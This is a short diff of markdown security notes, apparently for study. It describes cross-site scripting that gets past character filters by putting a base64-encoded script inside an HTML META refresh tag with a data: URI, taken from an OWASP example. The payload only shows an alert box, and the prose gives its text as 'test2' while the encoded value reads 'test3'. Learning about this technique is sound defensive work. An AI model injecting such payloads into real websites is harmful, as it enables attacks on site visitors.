@@ -3,7 +3,7 @@
 We can use encoded script injection directly in the url.
 We need to encode a part of the injection to bypass restrictions like special chars
 
-With the example from owasp, we can inject a JS script in the META tag and will encode <script>alert('test2')</script> in base64
+With the example from owasp, we can inject a JS script in the META tag and will encode \<script>alert('test2')\</script> in base64
 ```html
 <META HTTP-EQUIV="refresh"CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg">
 ```
